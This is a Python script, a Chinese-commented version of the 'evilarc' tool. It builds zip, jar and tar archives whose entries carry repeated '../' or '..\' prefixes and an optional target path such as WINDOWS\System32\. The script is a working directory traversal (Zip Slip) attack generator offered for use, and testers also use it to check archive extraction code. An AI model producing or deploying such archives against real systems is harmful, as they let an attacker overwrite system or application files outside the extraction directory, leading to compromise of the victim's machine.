#!/usr/bin/env python3
'''
作者: tangkaixing
日期: 2024-09-04
'''

import sys
import zipfile
import tarfile
import os
import argparse

def create_archive(input_file, output_file, depth, platform, path):
    # 根据平台确定目录前缀
    dir_prefix = "..\\" if platform == "win" else "../"
    if path and not path.endswith('\\' if platform == "win" else '/'):
        path += '\\' if platform == "win" else '/'

    # 构造归档路径
    archive_path = dir_prefix * depth + path + os.path.basename(input_file)

    # 确定创建归档的模式
    ext = os.path.splitext(output_file)[1].lower()
    mode = 'w' if not os.path.exists(output_file) else 'a'
    
    # 创建归档
    if ext in [".zip", ".jar"]:
        with zipfile.ZipFile(output_file, mode) as zf:
            zf.write(input_file, archive_path)
    elif ext in [".tar", ".gz", ".tgz", ".bz2"]:
        tar_mode = {
            ".tar": mode,
            ".gz": "w:gz",
            ".tgz": "w:gz",
            ".bz2": "w:bz2"
        }.get(ext, None)
        if tar_mode is None:
            sys.exit(f"无法识别输出归档格式 {ext}")
        with tarfile.open(output_file, tar_mode) as tf:
            tf.add(input_file, archive_path)
    else:
        sys.exit(f"无法识别输出归档格式 {ext}")

    print(f"创建了 {output_file}，包含 {archive_path}")

def main():
    parser = argparse.ArgumentParser(description='创建一个包含目录遍历的文件的归档文件',
                                     prog='evilarc',
                                     usage='%(prog)s <输入文件>')
    parser.add_argument('input_file', help="输入文件的路径")
    parser.add_argument('--output-file', '-f', default="evil.zip", help="输出归档文件的名称。归档类型基于文件扩展名。")
    parser.add_argument('--depth', '-d', type=int, default=8, help="遍历的目录层级数。")
    parser.add_argument('--os', '-o', choices=['win', 'unix'], default="win", help="归档文件的操作系统平台（win|unix）。")
    parser.add_argument('--path', '-p', default="", help="遍历后包含在文件名中的路径。例如：WINDOWS\\System32\\")

    options = parser.parse_args()

    if not os.path.exists(options.input_file):
        sys.exit("无效的输入文件")

    create_archive(options.input_file, options.output_file, options.depth, options.os, options.path)

if __name__ == '__main__':
    main()
